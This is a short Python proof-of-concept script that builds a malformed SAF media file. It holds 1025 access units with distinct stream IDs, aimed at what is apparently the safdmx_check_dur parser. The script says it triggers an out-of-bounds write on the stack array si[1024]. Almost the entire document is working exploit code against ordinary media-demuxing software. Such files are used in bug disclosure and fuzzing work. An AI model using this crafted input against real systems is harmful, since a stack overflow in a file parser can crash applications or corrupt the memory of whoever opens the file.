#!/usr/bin/env python3
import struct

def be16(x): return struct.pack(">H", x & 0xffff)
def be32(x): return struct.pack(">I", x & 0xffffffff)

def make_au(stream_id, au_sn=0, rap=1, cts=0, au_type=7, ts_res=1000):
    # Layout expected by safdmx_check_dur():
    # u16: rap(1) + au_sn(15)
    # 2 bits + cts(30) -> packed into a u32 where top 2 bits are 0
    # u16: au_size (bytes of AU payload that follow: 2 bytes(type+stream_id) + payload)
    # u16: au_type(4) + stream_id(12)
    # payload for au_type 1/2/7: u16 + u24(ts_res)
    first16 = ((rap & 1) << 15) | (au_sn & 0x7fff)
    second32 = (cts & 0x3fffffff)  # top 2 bits are 0
    au_size = 7  # 2 bytes (type+stream_id) + 5 bytes (u16 + u24)
    type_stream = ((au_type & 0xF) << 12) | (stream_id & 0x0fff)
    payload = be16(0) + struct.pack(">I", ts_res)[1:]  # u24
    return be16(first16) + be32(second32) + be16(au_size) + be16(type_stream) + payload

def main(out="poc_saf_stack_oob_streaminfo.saf", n=1025):
    data = bytearray()
    for i in range(n):
        data += make_au(stream_id=i, au_sn=i & 0x7fff, cts=i)
    with open(out, "wb") as f:
        f.write(data)
    print(f"Wrote {out} ({len(data)} bytes) with {n} distinct stream_ids (triggers si[1024] overflow).")

if __name__ == "__main__":
    main()
